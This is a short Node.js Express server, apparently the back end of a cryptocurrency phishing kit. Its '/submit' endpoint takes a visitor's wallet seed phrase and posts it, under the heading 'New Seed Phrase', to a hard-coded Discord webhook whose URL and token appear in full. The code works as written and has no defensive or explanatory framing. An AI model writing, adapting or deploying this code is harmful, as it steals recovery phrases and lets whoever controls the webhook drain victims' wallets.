const express = require('express');
const path = require('path');
const fetch = require('node-fetch');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

app.post('/submit', async (req, res) => {
    const { seedPhrase } = req.body;
    const timestamp = new Date().toISOString();
    const webhookUrl = 'https://discord.com/api/webhooks/1347077151702122598/r9b3CXbZfurL3HbB8lX3BNYG31Hiq5kbPIn7bmdvRTAeTSR_w3Khs-vLpJLdPU3d9PE1';

    try {
        await fetch(webhookUrl, { 
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `**New Seed Phrase**\nTime: ${timestamp}\nPhrase: ${seedPhrase}`
            })
        });
        res.status(200).send('OK');
    } catch (err) {
        console.error('Webhook error:', err);
        res.status(500).send('Error');
    }
});

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});